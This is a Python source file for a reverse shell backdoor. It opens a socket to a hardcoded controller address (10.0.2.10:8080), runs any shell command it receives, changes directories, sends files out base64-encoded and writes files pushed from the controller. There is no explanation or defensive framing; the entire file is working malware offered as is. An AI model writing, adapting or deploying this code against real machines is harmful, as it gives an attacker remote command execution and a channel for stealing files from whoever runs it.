import socket
import subprocess
import simplejson
import os
import base64

class MySocket:
	def __init__(self, ip, port):
		self.myConnection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.myConnection.connect((ip,port))

	def commandExecution(self,command):
		return subprocess.check_output(command, shell=True)

	def jsonSend(self, data):
		jsonData = simplejson.dumps(data)
		self.myConnection.send(jsonData.encode("utf-8"))

	def jsonReceive(self):
		jsonData = ""
		while True:
			try:
				jsonData = jsonData + self.myConnection.recv(1024).decode()
				return simplejson.loads(jsonData)
			except ValueError:
				continue

	def executeCdCommand(self, directory):
		os.chdir(directory)
		return "Cd to " + directory

	def getFileContents(self, path):
		with open(path, "rb") as myFile:
			return base64.b64encode(myFile.read())

	def save_file(self,path,content):
		with open(path,"wb") as myFile:
			myFile.write(base64.b64decode(content))
			return "Upload OK"

	def startSocket(self):
		while True:
			command = self.jsonReceive()
			try:
				if command[0] == "quit":
					self.myConnection.close()
					exit()

				elif command[0] == "cd" and len(command) > 1:
					commandOutput = self.executeCdCommand(command[1])

				elif command[0] == "download":
					commandOutput = self.getFileContents(command[1])

				elif command[0] == "upload":
					commandOutput = self.save_file(command[1],command[2])

				else:
					commandOutput = self.commandExecution(command)

			except Exception:
				commandOutput = "Error!"

			self.jsonSend(commandOutput)

		self.myConnection.close()

mySocketObj = MySocket("10.0.2.10",8080)
mySocketObj.startSocket()